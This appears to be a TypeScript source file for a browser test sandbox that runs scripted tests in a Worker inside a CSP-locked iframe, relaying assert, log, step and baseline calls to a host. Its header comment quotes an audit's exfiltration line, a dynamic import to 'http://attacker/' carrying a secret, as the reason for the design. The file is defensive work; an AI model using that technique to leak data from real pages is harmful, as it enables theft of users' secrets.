import { CspFrameWorker, HARDEN_PRELUDE } from "./cspFrameWorker";
import type { EntitySnapshot, HostCall, HostResult, RunRequest, RunResult } from "./testSandbox.worker";
import type { TestHost, TestSandbox } from "./testSandbox";

/**
 * Runs scripted tests in a Worker nested inside a CSP-locked iframe.
 *
 * The bare-Worker version had no policy, and an audit exfiltrated data out of
 * it with `import("http://attacker/?" + secret)` — the request completes
 * before the module load rejects, so the leak lands regardless. Property
 * hardening cannot help: `import()` is syntax.
 *
 * The worker body lives here as a string because it has to be blob-loaded
 * inside the frame's opaque origin, where no same-origin module URL resolves.
 */
const WORKER_SOURCE =
  HARDEN_PRELUDE +
  String.raw`
var snapshot = {};
var nextCallId = 1;
var pending = new Map();

function callHost(method, args) {
  var callId = nextCallId++;
  return new Promise(function (resolve, reject) {
    pending.set(callId, { resolve: resolve, reject: reject });
    __reply({ type: "call", callId: callId, method: method, args: args });
  });
}

self.onmessage = function (event) {
  var message = event.data;
  if (!message) return;

  if (message.type === "callResult") {
    var entry = pending.get(message.callId);
    if (!entry) return;
    pending.delete(message.callId);
    if (message.snapshot) snapshot = message.snapshot;
    if (message.error) entry.reject(new Error(message.error));
    else entry.resolve(message.value);
    return;
  }

  if (message.type !== "run") return;
  snapshot = message.snapshot || {};

  var context = {
    scene: message.scene,
    // Synchronous, served from a snapshot the host refreshes on every reply.
    // entityFor('Hero Cube').rotation.y is the documented shape and the
    // starter project uses it; making it async silently broke every script.
    entityFor: function (name) { return snapshot[name] || null; },
    assert: function (condition, text) { return callHost("assert", [condition, text || "assertion failed"]); },
    log: function (text) { callHost("log", [text]); },
    step: function (frames) { return callHost("step", [frames]); },
    baseline: function (name, dataUrl, threshold) { return callHost("baseline", [name, dataUrl, threshold]); }
  };

  (async function () {
    try {
      var body = [
        "const scene = context.scene;",
        "const entityFor = context.entityFor;",
        "const assert = context.assert;",
        "const log = context.log;",
        "const step = context.step;",
        "const baseline = context.baseline;",
        message.script
      ].join("\n");
      var run = new Function("context", '"use strict"; return (async () => { ' + body + ' })();');
      await run(context);
      __reply({ type: "done", testId: message.testId });
    } catch (error) {
      __reply({ type: "done", testId: message.testId, error: String((error && error.message) || error) });
    }
  })();
};
`;

export class FrameTestSandbox implements TestSandbox {
  private host: CspFrameWorker | null = null;
  private settle: ((error?: Error) => void) | null = null;
  private testHost: TestHost | null = null;

  private ensure(): CspFrameWorker {
    if (this.host) return this.host;
    this.host = new CspFrameWorker(WORKER_SOURCE, (data) => this.receive(data));
    return this.host;
  }

  private receive(data: unknown): void {
    const message = data as HostCall | RunResult;
    if (message?.type === "done") {
      this.settle?.(message.error ? new Error(message.error) : undefined);
      return;
    }
    if (message?.type === "call") void this.answer(message);
  }

  private async answer(call: HostCall): Promise<void> {
    const host = this.testHost;
    if (!host || !this.host) return;
    // Every reply carries post-call scene state so entityFor stays synchronous.
    const reply = (result: Omit<HostResult, "type" | "callId" | "snapshot">) =>
      void this.host?.post({
        type: "callResult",
        callId: call.callId,
        snapshot: host.snapshot(),
        ...result,
      } satisfies HostResult);

    try {
      switch (call.method) {
        case "assert":
          host.assert(Boolean(call.args[0]), String(call.args[1] ?? "assertion failed"));
          return reply({ value: true });
        case "log":
          host.log(String(call.args[0]));
          return reply({ value: true });
        case "step":
          await host.step(Number(call.args[0]));
          return reply({ value: true });
        case "baseline":
          return reply({
            value: await host.baseline(
              String(call.args[0]),
              String(call.args[1]),
              call.args[2] === undefined ? undefined : Number(call.args[2]),
            ),
          });
        default:
          return reply({ error: `unknown host call ${String(call.method)}` });
      }
    } catch (error) {
      reply({ error: error instanceof Error ? error.message : String(error) });
    }
  }

  async run(
    testId: string,
    script: string,
    scene: RunRequest["scene"],
    host: TestHost,
    timeoutMs: number,
  ): Promise<void> {
    const frame = this.ensure();
    this.testHost = host;

    return new Promise<void>((resolve, reject) => {
      const timer = window.setTimeout(() => {
        this.settle = null;
        // A spinning test is on the worker thread; the frame terminates it.
        frame.restart();
        reject(new Error(`test timed out after ${timeoutMs}ms`));
      }, timeoutMs);

      this.settle = (error?: Error) => {
        window.clearTimeout(timer);
        this.settle = null;
        if (error) reject(error);
        else resolve();
      };

      void frame.post({
        type: "run",
        testId,
        script,
        scene,
        snapshot: host.snapshot() as Record<string, EntitySnapshot>,
      } satisfies RunRequest);
    });
  }

  dispose(): void {
    this.settle = null;
    this.testHost = null;
    this.host?.dispose();
    this.host = null;
  }
}
